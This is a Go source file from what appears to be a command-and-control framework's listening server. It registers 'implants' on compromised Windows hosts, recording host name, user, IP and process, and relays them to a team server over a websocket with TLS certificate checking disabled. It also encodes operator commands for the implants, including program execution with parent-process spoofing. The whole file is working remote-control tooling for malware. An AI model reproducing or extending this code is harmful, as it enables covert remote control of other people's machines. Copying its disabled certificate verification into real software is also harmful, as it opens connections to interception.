package ListeningServer

import (
	"AllSecure/ListeningServer/Common"
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"strings"
)

func CreateWebSocketConnection() (*websocket.Conn, error) {

	var (
		token   []byte
		err     error
		headers http.Header
	)

	endpoint := "wss://" + g_clientobj.Server + "/ws"
	token, err = json.Marshal(g_clientobj.Cookie.Token.JwtToken)
	if err != nil {
		log.Println("[error] attempting to marshal JWT token")
		return nil, err
	}
	//set our request authorization header to be our jwt  token.
	headers = make(http.Header)
	headers.Set("Authorization", strings.Trim(string(token), "\""))
	websocket.DefaultDialer.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	conn, _, err := websocket.DefaultDialer.Dial(endpoint, headers)
	if err != nil {
		log.Println("[error] attempting to make websocket connection", err)
		return nil, err
	}

	return conn, nil
}

func StartEventHandler(token string, teamserver string) error {
	var (
		err  error
		conn *websocket.Conn
	)
	g_clientobj.Cookie.Token.JwtToken = token
	g_clientobj.Server = teamserver
	conn, err = CreateWebSocketConnection()
	if err != nil {
		log.Println("[error] attempting to create websocket connection", err)
		return err
	}

	g_clientobj.Conn = Common.NewSafeWebSocket(conn)

	go RecvEvent()

	return nil
}

func SendEvent(EventName string, ImpCtx Common.ImplantContext, Alive bool, Data interface{}) error {
	var NewMessage Common.NewWebSocketMessage
	var err error
	var NewImplant Common.ImplantData
	var TempData []byte

	switch EventName {
	case "RegisterImplant":

		NewMessage.MessageType = "RegisterImplant"
		NewImplant.ImplantId = ImpCtx.Agent_id
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.Computer = ImpCtx.Host_name
		NewImplant.InternalIP = ImpCtx.Ip_addr
		NewImplant.ExternalIP = ImpCtx.Ip_addr
		NewImplant.User = ImpCtx.User_name
		NewImplant.Health = Alive
		NewImplant.OS = Common.GetWindowsVersion(ImpCtx.Os_info)
		NewImplant.Process = ImpCtx.Process_name
		NewImplant.PID = ImpCtx.Process_id
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}

		break

	case "UpdateHealth":
		NewMessage.MessageType = "UpdateHealth"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.Health = Alive
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}

		break

	case "UpdateCheckin":
		NewMessage.MessageType = "UpdateCheckin"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()
		TempData, err = json.Marshal(NewImplant)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}

		break

	case "SendModuleData":
		var (
			ModuleData map[string][]byte
			ok         bool
		)

		NewMessage.MessageType = "SendModuleData"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()

		if ModuleData, ok = Data.(map[string][]byte); !ok {
			log.Println("[error] attempting to cast module data to map[string][]byte")
			return err
		}
		CombinedData := map[string]interface{}{
			"ImplantData": NewImplant,
			"ModuleData":  ModuleData,
		}
		TempData, err = json.Marshal(CombinedData)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}

		break

	case "SendExecuteData":
		var (
			ProcID uint32
			ok     bool
		)
		NewMessage.MessageType = "SendExecuteData"
		NewImplant.ImplantName = ImpCtx.Agent_name
		NewImplant.LastCheckIn = ImpCtx.LastCheckin.String()

		if Data != nil {
			if ProcID, ok = Data.(uint32); !ok {
				log.Println("[error] attempting to cast process ID to int", err)
				return err
			}
		} else {
			ProcID = 0
		}

		CombinedData := map[string]interface{}{
			"ImplantData": NewImplant,
			"ProcID":      ProcID,
		}
		TempData, err = json.Marshal(CombinedData)
		if err != nil {
			log.Println("[error] attempting to marshal the implant data", err)
			return err
		}

	default:
		break
	}

	NewMessage.Message = string(TempData)
	err = g_clientobj.Conn.WriteJSON(NewMessage)
	if err != nil {
		log.Println("[error] attempting to send implant data to the team server web socket connection", err)
	}

	return nil
}

func RecvEvent() {
	var (
		NewWSMessage Common.NewWebSocketMessage
		err          error
	)
	for {
		err = g_clientobj.Conn.ReadJSON(&NewWSMessage)
		if err != nil {
			log.Println("[error] attempting to read web socket message ", err)
			continue
		}
		switch NewWSMessage.MessageType {

		case "GetActiveImplants":
			if len(agent_map) > 0 {
				for _, agent := range agent_map {
					//we don't care if the agent is alive or dead. We just want to know which agents are registered until agent is dead by manual killing or kill-date has been reached.
					err = SendEvent("RegisterImplant", agent.Context, agent.Alive, nil)
					if err != nil {
						log.Println("[error] attempting to send implant data to the team server web socket connection", err)
						continue
					}
				}
			}

			break // GET ACTIVE IMPLANTS

		case "ImplantCommand":
			var ImplantCmd Common.ImplantCommandData
			var AgentCmd Common.AgentCmd
			var DataBuf bytes.Buffer

			err = json.Unmarshal([]byte(NewWSMessage.Message), &ImplantCmd)
			if err != nil {
				log.Println("[error] attempting to unmarshal the implant command data", err)
				break
			}

			agent := agent_map[ImplantCmd.ImplantName]
			AgentCmd.MagicValue = agent.Context.Magic_val

			var (
				exec    string
				spoof   string
				piped   bool
				args    []string
				numargs = len(ImplantCmd.Args)
			)

			log.Println(ImplantCmd)
			log.Println(ImplantCmd.Args)
			//parse our data from the client.
			// and determine number of arguments.

			for _, str := range ImplantCmd.Args {
				if strings.Contains(str, "exec:") {
					exec = strings.TrimPrefix(str, "exec:")
				} else if strings.Contains(str, "spoof:") {
					spoof = strings.TrimPrefix(str, "spoof:")
				} else if strings.Contains(str, "piped:") {
					if strings.Contains(str, "true") {
						piped = true
					} else {
						piped = false
					}
				} else {
					if str == "null" {
						numargs -= 1
						continue
					}

					args = append(args, str)
				}
			}

			//write the number of arguments for the implant to parse.
			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(numargs)); err != nil {
				log.Println("[error] attempting to write the number of arguments to the data buffer", err)
				break
			}

			//write the piped boolean to implant.
			if piped {
				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(1)); err != nil {
					log.Println("[error] attempting to write the number of arguments to the data buffer", err)
				}
			} else {
				if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(0)); err != nil {
					log.Println("[error] attempting to write the number of arguments to the data buffer", err)
				}
			}

			//write the parent process to spoof to argument if it was specified.
			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(spoof))); err != nil {
				log.Println("[error] attempting to write the length of the argument to the data buffer", err)
			}
			if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(spoof)); err != nil {
				log.Println("[error] attempting to write the argument to the data buffer", err)
			}

			//write the program we want to execute to argument.
			if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(exec))); err != nil {
				log.Println("[error] attempting to write the length of the argument to the data buffer", err)
			}
			if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(exec)); err != nil {
				log.Println("[error] attempting to write the argument to the data buffer", err)
			}

			//write the rest of our arguments.
			if len(args) > 0 {
				for _, arg := range args {
					if err = binary.Write(&DataBuf, binary.LittleEndian, uint32(len(arg))); err != nil {
						log.Println("[error] attempting to write the length of the argument to the data buffer", err)
						break
					}
					if err = binary.Write(&DataBuf, binary.LittleEndian, []byte(arg)); err != nil {
						log.Println("[error] attempting to write the argument to the data buffer", err)
						break

					}
				}
			}

			switch strings.ToLower(ImplantCmd.Command) {
			case "lm":
				AgentCmd.CmdID = Common.CMD_LIST_MODULES
				AgentCmd.RequestID = 69
				AgentCmd.DataBuffer = DataBuf.Bytes()
				AgentCmd.Size = uint32(DataBuf.Len())
				break
			case "exec", "execute":
				AgentCmd.CmdID = Common.CMD_EXECUTE
				AgentCmd.RequestID = 69
				AgentCmd.DataBuffer = DataBuf.Bytes()
				AgentCmd.Size = uint32(DataBuf.Len())
				break

			default:
				break
			}

			log.Println("[info] attempting to send command [", ImplantCmd.Command, "] with args [", ImplantCmd.Args, "] to agent [", agent.Context.Agent_name, "]")
			agent.CmdQue.Enqueue(AgentCmd)

			break // IMPLANT COMMAND

		default:
			break // DEFAULT
		}

	}
}
